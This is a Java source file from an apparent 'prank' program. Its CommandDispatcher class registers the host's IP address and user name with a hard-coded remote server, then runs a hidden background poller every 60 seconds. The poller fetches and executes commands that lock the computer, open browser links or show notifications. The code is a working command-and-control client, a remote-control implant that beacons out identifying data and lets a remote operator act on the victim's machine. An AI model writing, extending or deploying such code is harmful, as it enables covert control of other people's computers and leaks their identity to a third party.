package ru.crystals.prankleo.dispatcher;

import org.springframework.core.ParameterizedTypeReference;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestTemplate;
import ru.crystals.prankleo.dto.Command;
import ru.crystals.prankleo.dto.CurrentPointInfo;
import ru.crystals.prankleo.dto.LeoNotificationCommand;
import ru.crystals.prankleo.dto.LockComputatorCommand;
import ru.crystals.prankleo.dto.OpenLinkInBrowserCommand;
import ru.crystals.prankleo.dto.TrayNotificationCommand;
import ru.crystals.prankleo.processor.CommandProcessor;
import ru.crystals.prankleo.processor.LeoNotificationCommandProcessor;
import ru.crystals.prankleo.processor.LockComputatorCommandProcessor;
import ru.crystals.prankleo.processor.OpenLinkInBrowserCommandProcessor;
import ru.crystals.prankleo.processor.TrayNotificationCommandProcessor;
import ru.crystals.prankleo.util.NetworkUtil;

import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class CommandDispatcher {

    private static final String SERVER_IP = "194.87.236.72";
    private static final int SERVER_PORT = 8080;
    private static final String APPLICATION_PREFIX = "prankleo";

    private RestTemplate restTemplate = new RestTemplate();

    private CurrentPointInfo currentPointInfo;

    private static CommandDispatcher ourInstance = new CommandDispatcher();

    private static Map<String, CommandProcessor> commandProcessorMap = new HashMap<>();

    static {
        commandProcessorMap.put(LeoNotificationCommand.class.getName(), new LeoNotificationCommandProcessor());
        commandProcessorMap.put(LockComputatorCommand.class.getName(), new LockComputatorCommandProcessor());
        commandProcessorMap.put(OpenLinkInBrowserCommand.class.getName(), new OpenLinkInBrowserCommandProcessor());
        commandProcessorMap.put(TrayNotificationCommand.class.getName(), new TrayNotificationCommandProcessor());
    }

    private CommandDispatcher() {
    }

    public static CommandDispatcher getInstance() {
        return ourInstance;
    }

    public void start() {
        registerCurrentPoint();
        startShadowBackgroundTask();
    }

    /**
     * Зарегистрирует текущего пользователя на удаленном сервере для дальнейшего назначения команд
     */
    private void registerCurrentPoint() {
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON);

        HttpEntity<CurrentPointInfo> entity = new HttpEntity<>(getCurrentPointInfo(), headers);
        restTemplate.exchange(
                String.format("http://%s:%d/%s/points/register", SERVER_IP, SERVER_PORT, APPLICATION_PREFIX),
                HttpMethod.POST,
                entity,
                String.class
        );
    }

    /**
     * Запустить поток по таймеру опрашивающий сервер на предмет наличия команд для выполнения
     */
    private static void startShadowBackgroundTask() {
        ScheduledExecutorService service = Executors.newSingleThreadScheduledExecutor();
        service.scheduleWithFixedDelay(CommandDispatcher.getInstance()::refreshCommands, 0, 60, TimeUnit.SECONDS);
    }

    /**
     * Получит с удаленного сервера комманды и выполнит их
     */
    public void refreshCommands() {
        try {
            List<Command> commands = getCommandsFromServer();
            for (Command command : commands) {
                runCommand(command);
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    /**
     * Постучиться на удаленный сервер и вернет список команд
     * @return список запланированных для выполнения команд
     */
    private List<Command> getCommandsFromServer() {
        ResponseEntity<List<Command>> commands = restTemplate.exchange(
                createUrl(),
                HttpMethod.GET,
                null,
                new ParameterizedTypeReference<List<Command>>() {});
        return commands.getBody();
    }

    private void runCommand(Command command) {
        CommandProcessor commandProcessor = commandProcessorMap.get(command.getClass().getName());
        if(commandProcessor != null) {
            commandProcessor.runCommand(command);
        }
    }

    private String createUrl() {
        return String.format("http://%s:%d/%s/commands/%s", SERVER_IP, SERVER_PORT, APPLICATION_PREFIX, getCurrentPointInfo().getIp());
    }

    private CurrentPointInfo getCurrentPointInfo() {
        if(currentPointInfo == null) {
            currentPointInfo = new CurrentPointInfo();
            currentPointInfo.setIp(NetworkUtil.getCurrentIP());
            currentPointInfo.setUserName(System.getProperty("user.name"));
        }

        return currentPointInfo;
    }
}
